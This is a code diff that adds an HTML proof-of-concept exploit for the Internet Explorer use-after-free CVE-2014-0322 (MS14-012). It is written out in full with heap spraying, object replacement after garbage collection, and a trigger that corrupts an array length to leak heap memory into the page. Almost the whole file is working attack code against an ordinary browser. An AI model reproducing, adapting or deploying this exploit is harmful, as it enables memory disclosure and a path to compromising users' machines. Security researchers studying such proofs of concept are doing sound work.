@@ -1,0 +1,127 @@
+<!--
+This is a PoC to use MS14-012/CVE-2014-0322 to get memory disclosure using @tombkeeper's jscript9 object spray technique. 
+I have tested this with a stock Windows 8 install with IE10.. your mileage may very.
+Original Poc: Jean-Jamil Khalife (http://www.hdwsec.fr)
+-->
+
+<html>
+<head>
+</head>
+<body>
+<script>
+
+var g_arr = [];
+var arrLen = 0x250;
+
+function dword2data(dword)
+{
+    var d = Number(dword).toString(16);
+    while (d.length < 8)
+        d = '0' + d;
+
+    return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
+}
+
+function eXpl()
+{
+    Math.atan2(0xbabe, "eXpl func start"); 
+    var a=0;
+
+    for (a=0; a < arrLen; a++) {
+        g_arr[a] = document.createElement('div');
+    }
+	
+    // Build a new object
+    var b = dword2data(0x19fffff3);
+    while (b.length < 0x360)
+    {
+        // mov     eax,dword ptr [esi+98h]
+        // ...
+        // mov     eax,dword ptr [eax+8]
+        // and     dword ptr [eax+2F0h],0FFFFFFBFh
+        if (b.length == (0x98 / 2))
+        {
+            b += dword2data(0x14141424);       
+	}
+        // mov     ecx,dword ptr [edx+94h]
+        // mov     eax,dword ptr [ecx+0Ch]
+        else if (b.length == (0x94 / 2))
+        {
+            b += dword2data(0x14141414);
+           
+	}
+        // mov     eax,dword ptr [edx+15Ch]
+        // mov     ecx,dword ptr [eax+edx*8]
+        else if (b.length == (0x15c / 2))
+        {
+            b += dword2data(0x14141414);
+        }
+        else
+        {
+            b += dword2data(0x14141429-0x10);
+	}
+    }
+    
+    var d = b.substring(0, ( 0x340 - 2 )/2);
+    
+    try {
+        this.outerHTML=this.outerHTML
+    } 
+    catch(e) {
+
+    }
+	
+    CollectGarbage();
+
+    // Replace freed object
+    for (a=0; a < arrLen; a++)
+    {
+        g_arr[a].title = d.substring(0, d.length);
+    }
+}
+
+//shamelessly pilfered from https://stackoverflow.com/questions/21647928/javascript-unicode-string-to-hex
+String.prototype.hexEncode = function(){
+    var hex, i;
+
+    var result = "";
+    for (i=0; i<this.length; i++) {
+        hex = this.charCodeAt(i).toString(16);
+        result += ("000"+hex).slice(-4);
+    }
+
+    return result
+}
+
+// Trigger the vulnerability
+function trigger()
+{
+	var derp = "AA";
+	var count = 0x2000000;
+	var strAttr = new Array(count);
+	for (var i = 0; i < count; i++) {
+     		strAttr[i] = derp.substr(0,2);
+	}
+
+
+	var a = document.getElementsByTagName("script");
+	var b = a[0];
+	b.onpropertychange = eXpl;
+	var c = document.createElement('SELECT');
+	c = b.appendChild(c);
+
+	for (var j=0; j<strAttr.length; j++) {
+		if (strAttr[j] != "AA") {
+			document.write("Leaking heap contents.. <br>");
+			document.write("<br>");
+			document.write(strAttr[j].hexEncode());
+		}
+	}
+}
+
+document.write("Incrementing length of array at 0x14141428..<br>");
+trigger();
+
+</script>
+</body>
+</html>
